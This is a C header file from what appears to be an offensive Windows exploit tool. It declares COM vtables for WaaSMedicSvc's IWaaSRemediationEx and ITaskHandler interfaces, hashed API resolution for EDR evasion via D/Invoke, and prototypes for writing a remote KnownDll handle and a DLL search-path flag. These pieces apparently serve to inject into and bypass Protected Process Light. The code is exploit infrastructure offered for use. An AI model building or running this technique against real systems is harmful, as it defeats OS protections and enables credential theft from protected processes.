#pragma once

//#include <comdef.h>
#include <oaidl.h>
#include <objbase.h>

#include "dinvoke.h"
#include "ppl/ppl_medic.h"
#include "ppl/ppl_utils.h"

#define CLSID_WAASREMEDIATION   { 0x72566e27, 0x1abb, 0x4eb3, { 0xb4, 0xf0, 0xeb, 0x43, 0x1c, 0xb1, 0xcb, 0x32 } } // WaaSRemediationAgent - 72566E27-1ABB-4EB3-B4F0-EB431CB1CB32
#define IID_WAASREMEDIATIONEX   { 0xb4c1d279, 0x966e, 0x44e9, { 0xa9, 0xc5, 0xcc, 0xaf, 0x4a, 0x77, 0x02, 0x3d } } // IWaaSRemediationEx - B4C1D279-966E-44E9-A9C5-CCAF4A77023D
#define IID_TASKHANDLER         { 0x839d7762, 0x5121, 0x4009, { 0x92, 0x34, 0x4f, 0x0d, 0x19, 0x39, 0x4f, 0x04 } } // ITaskHandler - 839D7762-5121-4009-9234-4F0D19394F04
#define IID_ALL_ZERO            { 0x0, 0x0, 0x0, { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 } }

#define EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 0
#define EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1 1
#define EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_2 2

typedef HRESULT(WINAPI* CoCancelCall_t)(DWORD dwThreadId, ULONG ulTimeout);
typedef HRESULT(WINAPI* CoInitializeEx_t)(LPVOID pvReserved, DWORD dwCoInit);
typedef HRESULT(WINAPI* CoCreateInstance_t)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
typedef HRESULT(WINAPI* CoEnableCallCancellation_t)(LPVOID pReserved);
typedef VOID   (WINAPI* CoUninitialize_t)();
typedef HRESULT(WINAPI* CoDisableCallCancellation_t)(LPVOID pReserved);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL(WINAPI* GetExitCodeThread_t)(HANDLE hThread, LPDWORD lpExitCode);
typedef HMODULE(WINAPI* LoadLibraryW_t)(LPCWSTR lpLibFileName);

#define CoCancelCall_SW2_HASH              0x058CEE0B
#define CoInitializeEx_SW2_HASH            0xEC4E1F34
#define CoCreateInstance_SW2_HASH          0xEEDC39EE
#define CoEnableCallCancellation_SW2_HASH  0xCF44EFD2
#define CoUninitialize_SW2_HASH            0xEF38CFFF
#define CoDisableCallCancellation_SW2_HASH 0x0E54ED00
#define CreateThread_SW2_HASH              0x2C912627
#define WaitForSingleObject_SW2_HASH       0x9E8B4EA7
#define GetExitCodeThread_SW2_HASH         0xB69934BF
#define LoadLibraryW_SW2_HASH              0x3EBB5CB0

typedef HRESULT STDMETHODCALLTYPE QueryInterfacePtr(REFIID iid, _COM_Outptr_ LPVOID *ppv);
typedef ULONG   STDMETHODCALLTYPE AddRefPtr(REFIID iid);
typedef ULONG   STDMETHODCALLTYPE ReleasePtr(REFIID iid);

typedef HRESULT STDMETHODCALLTYPE LaunchDetectionOnlyPtr(REFIID iid, BSTR bstrCallerApplicationName, ULONGLONG pbstrPlugins);
typedef HRESULT STDMETHODCALLTYPE LaunchRemediationOnlyPtr(REFIID iid, BSTR bstrPlugins, BSTR bstrCallerApplicationName, ULONGLONG varResults);

typedef HRESULT STDMETHODCALLTYPE StartPtr(REFIID iid, IUnknown* pHandlerServices, BSTR data);
typedef HRESULT STDMETHODCALLTYPE StopPtr(REFIID iid, HRESULT* pRetCode);
typedef HRESULT STDMETHODCALLTYPE PausePtr(REFIID iid);
typedef HRESULT STDMETHODCALLTYPE ResumePtr(REFIID iid);

typedef HRESULT STDMETHODCALLTYPE InvokePtr(PVOID iid, DISPID dispIdMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS *pDispParams, VARIANT *pVarResult, EXCEPINFO *pExcepInfo, UINT *puArgErr);
typedef HRESULT STDMETHODCALLTYPE GetIDsOfNamesPtr(PVOID iid, REFIID riid, LPOLESTR *rgszNames, UINT cNames, LCID lcid, DISPID *rgDispId);

typedef struct _IWaaSRemediationExVtbl {
    /*** IUnknown methods ***/
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(
        IDispatch *This,
        REFIID riid,
        void **ppvObject);

    ULONG (STDMETHODCALLTYPE *AddRef)(
        IDispatch *This);

    ULONG (STDMETHODCALLTYPE *Release)(
        IDispatch *This);

    /*** IDispatch methods ***/
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(
        IDispatch *This,
        UINT *pctinfo);

    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(
        IDispatch *This,
        UINT iTInfo,
        LCID lcid,
        ITypeInfo **ppTInfo);

    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(
        IDispatch *This,
        REFIID riid,
        LPOLESTR *rgszNames,
        UINT cNames,
        LCID lcid,
        DISPID *rgDispId);

    HRESULT (STDMETHODCALLTYPE *Invoke)(
        IDispatch *This,
        DISPID dispIdMember,
        REFIID riid,
        LCID lcid,
        WORD wFlags,
        DISPPARAMS *pDispParams,
        VARIANT *pVarResult,
        EXCEPINFO *pExcepInfo,
        UINT *puArgErr);

    /*** IWaaSRemediationEx methods ***/
    HRESULT (STDMETHODCALLTYPE *LaunchDetectionOnly)(
        IDispatch *This,
        BSTR bstrCallerApplicationName,
        ULONGLONG pbstrPlugins);

    HRESULT (STDMETHODCALLTYPE *LaunchRemediationOnly)(
        IDispatch *This,
        BSTR bstrPlugins,
        BSTR bstrCallerApplicationName,
        ULONGLONG varResults);
}IWaaSRemediationExVtbl, *PIWaaSRemediationExVtbl;

typedef struct _ITaskHandlerVtbl {
    /*** IUnknown methods ***/
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(
        IDispatch *This,
        REFIID riid,
        void **ppvObject);

    ULONG (STDMETHODCALLTYPE *AddRef)(
        IDispatch *This);

    ULONG (STDMETHODCALLTYPE *Release)(
        IDispatch *This);

    /*** ITaskHandler methods ***/
    HRESULT (STDMETHODCALLTYPE *Start)(
        IUnknown *This,
        IUnknown* pHandlerServices,
        BSTR data);

    HRESULT (STDMETHODCALLTYPE *Stop)(
        IUnknown *This,
        HRESULT* pRetCode);

    HRESULT (STDMETHODCALLTYPE *Pause)(
        IUnknown *This);

    HRESULT (STDMETHODCALLTYPE *Resume)(
        IUnknown *This);
}ITaskHandlerVtbl, *PITaskHandlerVtbl;

typedef struct _IWaaSRemediationEx {
    IWaaSRemediationExVtbl* lpVtbl;
} IWaaSRemediationEx, *PIWaaSRemediationEx;

typedef struct _ITaskHandler {
    ITaskHandlerVtbl* lpVtbl;
} ITaskHandler, *PITaskHandler;

/*
class __declspec(uuid("b4c1d279-966e-44e9-a9c5-ccaf4a77023d")) IWaaSRemediationEx : public IDispatch {
public:
    virtual HRESULT __stdcall LaunchDetectionOnly(BSTR bstrCallerApplicationName, ULONGLONG pbstrPlugins) = 0; // Modified version of LaunchDetectionOnly
    virtual HRESULT __stdcall LaunchRemediationOnly(BSTR bstrPlugins, BSTR bstrCallerApplicationName, ULONGLONG varResults) = 0; // Modified version of LaunchRemediationOnly
};

_COM_SMARTPTR_TYPEDEF(IWaaSRemediationEx, __uuidof(IWaaSRemediationEx));

class __declspec(uuid("839d7762-5121-4009-9234-4f0d19394f04")) ITaskHandler : public IUnknown {
public:
    virtual HRESULT __stdcall Start(IUnknown* pHandlerServices, BSTR data) = 0;
    virtual HRESULT __stdcall Stop(HRESULT* pRetCode) = 0;
    virtual HRESULT __stdcall Pause() = 0;
    virtual HRESULT __stdcall Resume() = 0;
};

_COM_SMARTPTR_TYPEDEF(ITaskHandler, __uuidof(ITaskHandler));
*/

typedef enum _ExploitStrategy
{
    ExtractByteAtIndex0,
    ExtractByteAtIndex1,
    ExtractByteAtIndex2
} ExploitStrategy;

typedef struct _WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM
{
    ExploitStrategy Strategy;
    IWaaSRemediationEx* WaaSRemediationEx;
    ULONG_PTR WriteAtLaunchDetectionOnly;
    ULONG_PTR WriteAtLaunchRemediationOnly;
    DISPID DispIdLaunchDetectionOnly;
    DISPID DispIdLaunchRemediationOnly;
    BSTR CallerApplicationName;
    BSTR Plugins;
} WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM, * PWRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM;

typedef struct _WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM
{
    IWaaSRemediationEx* WaaSRemediationEx;
    ULONG_PTR WriteAt;
    DISPID DispIdLaunchRemediationOnly;
    BSTR CallerApplicationName;
    BSTR Plugins;
} WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM, * PWRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM;

#define IWaaSRemediationEx_Invoke(This,dispIdMember,riid,lcid,wFlags,pDispParams,pVarResult,pExcepInfo,puArgErr)   \
    ( ((PIWaaSRemediationEx)This)->lpVtbl -> Invoke((IDispatch *)This,dispIdMember,riid,lcid,wFlags,pDispParams,pVarResult,pExcepInfo,puArgErr) )

#define IWaaSRemediationEx_GetIDsOfNames(This,riid,rgszNames,cNames,lcid,rgDispId) \
    ( ((PIWaaSRemediationEx)This)->lpVtbl -> GetIDsOfNames((IDispatch *)This,riid,rgszNames,cNames,lcid,rgDispId) ) 

#define ITaskHandler_Release(This) \
    ( ((PITaskHandler)This)->lpVtbl -> Release((IDispatch *)This) )

BOOL initialize_interface(
    PIWaaSRemediationEx* IWaaSRemediationExPtr);

BOOL find_combase_dll_search_flag_address(
    IN PULONG_PTR Address);

DWORD WINAPI write_remote_dll_search_path_flag_thread(LPVOID Parameter);

BOOL write_remote_dll_search_path_flag(
    IN PIWaaSRemediationEx IWaaSRemediationEx,
    IN DISPID DispIdLaunchRemediationOnly);

BOOL resolve_dispatch_ids(
    IN PIWaaSRemediationEx IWaaSRemediationEx,
    OUT DISPID *DispIdLaunchDetectionOnly,
    OUT DISPID *DispIdLaunchRemediationOnly);

BOOL calculate_write_addresses(
    IN PVOID BaseAddress,
    IN ULONG32 TargetValue,
    OUT PDWORD64 WriteAtLaunchDetectionOnly,
    OUT PDWORD64 WriteAtLaunchRemediationOnly);

BOOL write_remote_known_dll_handle(
    IN PIWaaSRemediationEx IWaaSRemediationEx,
    IN LONG TargetValue,
    IN DISPID DispIdLaunchDetectionOnly,
    IN DISPID DispIdLaunchRemediationOnly,
    IN DWORD64 WriteAtLaunchDetectionOnly,
    IN DWORD64 WriteAtLaunchRemediationOnly);

BOOL create_task_handler_instance();

BOOL release_client(
    IN PIWaaSRemediationEx IWaaSRemediationEx);
